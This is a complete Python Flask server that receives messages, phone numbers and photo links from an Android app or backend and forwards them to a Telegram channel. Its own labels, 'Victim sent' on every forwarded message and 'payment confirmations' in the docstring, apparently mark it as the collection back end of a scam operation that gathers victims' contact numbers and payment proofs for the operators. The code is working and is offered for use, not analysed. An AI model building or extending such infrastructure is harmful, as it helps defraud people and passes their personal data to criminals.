#!/usr/bin/env python3
"""
Telegram Bot for SMS Automation
Receives payment confirmations from Android/backend and forwards to Telegram channel
"""

from flask import Flask, request, jsonify
import requests
import os
import threading
import time
from datetime import datetime
from typing import List, Optional

app = Flask(__name__)

# Configuration from environment variables
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHANNEL_ID = os.getenv("TELEGRAM_CHANNEL_ID", "")
KEEP_ALIVE_KEY = os.getenv("KEEP_ALIVE_KEY", "")
KEEP_ALIVE_URL = os.getenv("KEEP_ALIVE_URL", "")  # Optional: external keep-alive service URL

# Telegram API base URL
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}" if TELEGRAM_BOT_TOKEN else ""

# Keep-alive thread
keep_alive_running = False
keep_alive_thread = None


def _normalise_caption(text: str, contact_number: Optional[str]) -> str:
    caption = text or ""
    if contact_number:
        caption = f"Victim sent - From: {contact_number}\n\n{caption}" if caption else f"Victim sent - From: {contact_number}"
    if not caption:
        caption = "Victim sent confirmation"
    return caption[:1024]


def send_to_telegram(text: str, photo_url: Optional[str] = None, contact_number: Optional[str] = None) -> dict:
    """Send message or photo to Telegram channel"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHANNEL_ID:
        return {"success": False, "error": "Telegram not configured"}

    if not text and not photo_url:
        return {"success": False, "error": "No content to send"}

    try:
        if photo_url:
            caption = _normalise_caption(text, contact_number)
            url = f"{TELEGRAM_API_URL}/sendPhoto"
            data = {
                "chat_id": TELEGRAM_CHANNEL_ID,
                "caption": caption,
                "photo": photo_url,
            }
            response = requests.post(url, json=data, timeout=30)
        else:
            full_message = text or "Victim sent confirmation"
            if contact_number:
                full_message = f"Victim sent - From: {contact_number}\n\n{full_message}"
            else:
                full_message = f"Victim sent - {full_message}"
            url = f"{TELEGRAM_API_URL}/sendMessage"
            data = {
                "chat_id": TELEGRAM_CHANNEL_ID,
                "text": full_message,
            }
            response = requests.post(url, json=data, timeout=30)

        if response.status_code == 200:
            return {"success": True, "message_id": response.json().get("result", {}).get("message_id")}
        return {"success": False, "error": f"Telegram API error: {response.status_code}", "details": response.text}
    except Exception as exc:  # noqa: BLE001
        return {"success": False, "error": str(exc)}


def keep_alive_worker():
    """Keep the server alive by making periodic requests"""
    global keep_alive_running
    while keep_alive_running:
        try:
            # Option 1: Ping our own health endpoint
            requests.get("http://localhost:5000/health", timeout=5)

            # Option 2: If KEEP_ALIVE_URL is set, ping external service
            if KEEP_ALIVE_URL:
                requests.get(KEEP_ALIVE_URL, timeout=10)

            time.sleep(300)  # Ping every 5 minutes
        except Exception as exc:  # noqa: BLE001
            print(f"Keep-alive error: {exc}")
            time.sleep(60)  # Retry in 1 minute on error


def start_keep_alive():
    """Start the keep-alive thread"""
    global keep_alive_running, keep_alive_thread
    if not keep_alive_running:
        keep_alive_running = True
        keep_alive_thread = threading.Thread(target=keep_alive_worker, daemon=True)
        keep_alive_thread.start()
        print("Keep-alive thread started")


def _pick_photo_url(photo_url: Optional[str], media_urls: Optional[List[str]]) -> Optional[str]:
    if photo_url:
        return photo_url
    if media_urls:
        for candidate in media_urls:
            if isinstance(candidate, str) and candidate.strip():
                return candidate.strip()
    return None


@app.route("/health", methods=["GET"])
def health():
    """Health check endpoint"""
    return jsonify({
        "status": "ok",
        "timestamp": datetime.now().isoformat(),
        "telegram_configured": bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHANNEL_ID)
    }), 200


@app.route("/send", methods=["POST"])
def send_message():
    """Receive message from Android/backend and forward to Telegram"""
    try:
        data = request.get_json(force=True, silent=True) or {}

        # Validate required fields
        if "message" not in data and "photo_url" not in data and "media_urls" not in data:
            return jsonify({"success": False, "error": "Missing 'message' or media fields"}), 400

        message = data.get("message", "")
        contact_number = data.get("contact_number")
        photo_url = data.get("photo_url")
        media_urls = data.get("media_urls")
        api_key = data.get("api_key")

        # Optional: Validate API key if KEEP_ALIVE_KEY is set
        if KEEP_ALIVE_KEY and api_key != KEEP_ALIVE_KEY:
            return jsonify({"success": False, "error": "Invalid API key"}), 401

        resolved_photo_url = _pick_photo_url(photo_url, media_urls if isinstance(media_urls, list) else None)

        # Send to Telegram
        result = send_to_telegram(message, resolved_photo_url, contact_number)

        if result["success"]:
            return jsonify(result), 200
        return jsonify(result), 500

    except Exception as exc:  # noqa: BLE001
        return jsonify({"success": False, "error": str(exc)}), 500


@app.route("/", methods=["GET"])
def root():
    """Root endpoint"""
    return jsonify({
        "service": "Telegram Bot for SMS Automation",
        "status": "running",
        "endpoints": {
            "/health": "GET - Health check",
            "/send": "POST - Send message to Telegram channel"
        }
    }), 200


if __name__ == "__main__":
    # Start keep-alive thread
    start_keep_alive()

    # Run Flask app
    port = int(os.getenv("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
else:
    # When running with gunicorn, start keep-alive thread
    start_keep_alive()


